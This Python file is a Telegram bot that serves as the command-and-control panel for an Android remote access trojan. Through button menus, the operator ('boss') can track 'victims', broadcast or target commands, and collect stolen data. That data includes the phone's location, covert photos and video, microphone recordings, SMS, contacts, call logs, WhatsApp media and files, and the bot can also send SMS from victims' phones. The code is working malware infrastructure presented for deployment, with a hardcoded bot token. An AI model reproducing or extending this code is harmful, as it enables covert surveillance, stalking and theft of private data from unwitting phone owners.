import asyncio
import json
import logging
import os
import time
from datetime import datetime
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ────────────────────────────────────────────────
#   CONFIGURATION - CHANGE THESE
# ────────────────────────────────────────────────

BOT_TOKEN = "8573419519:AAENWmJdf9gLX1GTxscwDKYLWyJaBAwD4HU"          # ← YOUR BOT TOKEN
ALLOWED_USERS = {"8573419519"}                                 # ← YOUR Telegram ID(s)
DATA_FOLDER = "rat_data"                                               # where files & logs saved

# Bot commands only work for these users
ADMIN_IDS = ALLOWED_USERS

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global storage of connected victims { uid: {last_seen, info, pending_commands} }
victims = {}
# uid → last command sent (for state machine if needed)
pending = {}

Path(DATA_FOLDER).mkdir(exist_ok=True)

# ────────────────────────────────────────────────
#   Helper functions
# ────────────────────────────────────────────────

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


def save_victim_data(uid: str, data: dict):
    path = Path(DATA_FOLDER) / f"{uid}.json"
    with path.open("w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def load_victim_data(uid: str) -> dict:
    path = Path(DATA_FOLDER) / f"{uid}.json"
    if path.exists():
        with path.open(encoding="utf-8") as f:
            return json.load(f)
    return {}


async def send_to_victim(context: ContextTypes.DEFAULT_TYPE, uid: str, command: dict):
    """Put command into victim's queue (bot will send when victim checks in)"""
    if uid not in victims:
        victims[uid] = {"last_seen": 0, "info": {}, "queue": []}

    victims[uid]["queue"].append(command)
    victims[uid]["last_seen"] = time.time()

    logger.info(f"Queued command for {uid}: {command.get('action')}")


async def broadcast_command(context: ContextTypes.DEFAULT_TYPE, cmd: dict):
    """Send same command to ALL online victims"""
    for uid in list(victims.keys()):
        await send_to_victim(context, uid, cmd)


# ────────────────────────────────────────────────
#   TELEGRAM BOT HANDLERS
# ────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_admin(user.id):
        await update.message.reply_text("⛔ Access denied.")
        return

    keyboard = [
        [InlineKeyboardButton("📡 Victims", callback_data="list_victims")],
        [InlineKeyboardButton("📍 Location", callback_data="location_menu")],
        [InlineKeyboardButton("📸 Media", callback_data="media_menu")],
        [InlineKeyboardButton("💬 Messages", callback_data="sms_menu")],
        [InlineKeyboardButton("🔊 Audio", callback_data="audio_menu")],
        [InlineKeyboardButton("📂 Files", callback_data="files_menu")],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🔥 **RAT C2 Control Panel**\n"
        f"Welcome back, boss {user.first_name}.\n"
        "Choose category:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user = query.from_user
    if not is_admin(user.id):
        await query.edit_message_text("⛔ No access.")
        return

    data = query.data

    if data == "list_victims":
        if not victims:
            txt = "😴 No victims online right now."
        else:
            lines = ["**Online Victims:**"]
            for uid, info in victims.items():
                last = datetime.fromtimestamp(info["last_seen"]).strftime("%Y-%m-%d %H:%M:%S")
                model = info.get("info", {}).get("model", "unknown")
                android = info.get("info", {}).get("android_version", "?")
                lines.append(f"• `{uid}` • {model} • Android {android} • {last}")
            txt = "\n".join(lines)

        await query.edit_message_text(txt, parse_mode="Markdown")

    elif data == "location_menu":
        keyboard = [
            [InlineKeyboardButton("📍 Get Current Location", callback_data="cmd_get_location")],
            [InlineKeyboardButton("🗺 Last Known Location", callback_data="cmd_last_location")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]
        await query.edit_message_text(
            "📍 **Location Controls**",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data == "media_menu":
        keyboard = [
            [InlineKeyboardButton("📸 Take Photo (back)", callback_data="cmd_take_photo_back")],
            [InlineKeyboardButton("🤳 Take Photo (front)", callback_data="cmd_take_photo_front")],
            [InlineKeyboardButton("🎥 Record 15s Video", callback_data="cmd_take_video")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]
        await query.edit_message_text("📸 **Media Controls**", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "audio_menu":
        keyboard = [
            [InlineKeyboardButton("🎤 Record Mic 30s", callback_data="cmd_mic_30")],
            [InlineKeyboardButton("🎤 Record Mic 60s", callback_data="cmd_mic_60")],
            [InlineKeyboardButton("⏹ Stop Mic", callback_data="cmd_mic_stop")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]
        await query.edit_message_text("🔊 **Microphone Controls**", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "sms_menu":
        keyboard = [
            [InlineKeyboardButton("📩 Read Last 20 SMS", callback_data="cmd_read_sms_20")],
            [InlineKeyboardButton("📇 Read All Contacts", callback_data="cmd_read_contacts")],
            [InlineKeyboardButton("📞 Read Call Logs (last 30)", callback_data="cmd_call_log")],
            [InlineKeyboardButton("📤 Send SMS", callback_data="cmd_send_sms_form")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]
        await query.edit_message_text("💬 **Communication Controls**", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "files_menu":
        keyboard = [
            [InlineKeyboardButton("📂 List DCIM", callback_data="cmd_list_dcim")],
            [InlineKeyboardButton("📂 List Downloads", callback_data="cmd_list_downloads")],
            [InlineKeyboardButton("📂 List WhatsApp Media", callback_data="cmd_list_whatsapp")],
            [InlineKeyboardButton("⬇ Download File", callback_data="cmd_download_file_form")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")],
        ]
        await query.edit_message_text("📂 **File Controls**", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("cmd_"):
        cmd_name = data[4:]
        await query.edit_message_text(f"🚀 Queuing command: **{cmd_name}**\nSelect victim or broadcast...")

        keyboard = [[InlineKeyboardButton("🌐 Broadcast ALL", callback_data=f"exec_all_{cmd_name}")]]
        for uid in victims:
            keyboard.append([InlineKeyboardButton(f"{uid}", callback_data=f"exec_{uid}_{cmd_name}")])

        keyboard.append([InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")])

        await query.message.reply_text("Choose target:", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("exec_all_"):
        action = data[9:]
        cmd = {"action": action, "timestamp": time.time()}
        await broadcast_command(context, cmd)
        await query.edit_message_text(f"✅ Command **{action}** sent to **ALL** victims!")

    elif data.startswith("exec_"):
        parts = data[5:].split("_", 1)
        uid, action = parts[0], parts[1]
        cmd = {"action": action, "timestamp": time.time()}
        await send_to_victim(context, uid, cmd)
        await query.edit_message_text(f"✅ Command **{action}** queued for victim `{uid}`")

    elif data == "main_menu":
        await start(update, context)


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive data from RAT (victim sends messages to bot)"""
    msg = update.message
    if not msg.text:
        return

    text = msg.text.strip()

    # Expected format from RAT:
    # [UID]json_data_here
    if not text.startswith("[") or "]" not in text:
        return

    try:
        uid_end = text.index("]")
        uid = text[1:uid_end]
        payload = json.loads(text[uid_end+1:])

        if uid not in victims:
            victims[uid] = {"last_seen": time.time(), "info": {}, "queue": []}

        victims[uid]["last_seen"] = time.time()

        action = payload.get("action")

        if action == "checkin":
            victims[uid]["info"] = payload.get("info", {})
            save_victim_data(uid, victims[uid])
            logger.info(f"Victim {uid} checked in - {payload.get('info')}")

            # Send queued commands
            if victims[uid]["queue"]:
                for cmd in victims[uid]["queue"]:
                    await msg.reply_text(f"[TO_{uid}]{json.dumps(cmd)}")
                victims[uid]["queue"].clear()

        elif action == "location":
            loc = payload.get("location", {})
            lat = loc.get("lat")
            lon = loc.get("lon")
            acc = loc.get("accuracy", "?")
            txt = f"📍 **Victim {uid}**\nLat: {lat}\nLon: {lon}\nAccuracy: {acc}m"
            await msg.reply_location(latitude=lat, longitude=lon)
            await msg.reply_text(txt)

        elif action == "photo":
            photo_path = Path(DATA_FOLDER) / f"{uid}_photo_{int(time.time())}.jpg"
            await msg.reply_photo(photo=msg.photo[-1].file_id)
            # You can also download it
            # file = await msg.photo[-1].get_file()
            # await file.download_to_drive(photo_path)

        elif action == "video":
            await msg.reply_video(video=msg.video.file_id)

        elif action == "audio":
            await msg.reply_voice(voice=msg.voice.file_id)

        elif action == "sms":
            sms_list = payload.get("sms", [])
            if sms_list:
                lines = [f"**SMS from {uid}**"]
                for s in sms_list[:30]:
                    lines.append(f"{s.get('date')} | {s.get('address')} → {s.get('body')[:80]}")
                await msg.reply_text("\n".join(lines))

        elif action == "file_list":
            files = payload.get("files", [])
            txt = f"**Files ({payload.get('path')})**\n" + "\n".join(files[:50])
            await msg.reply_text(txt)

        elif action == "file_download":
            await msg.reply_document(document=msg.document.file_id)

        else:
            await msg.reply_text(f"[{uid}] {json.dumps(payload, indent=2)}")

    except Exception as e:
        logger.error(f"Error processing message: {e}", exc_info=True)


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)


# ────────────────────────────────────────────────
#   MAIN
# ────────────────────────────────────────────────

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    app.add_error_handler(error_handler)

    print("RAT Telegram C2 bot started...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
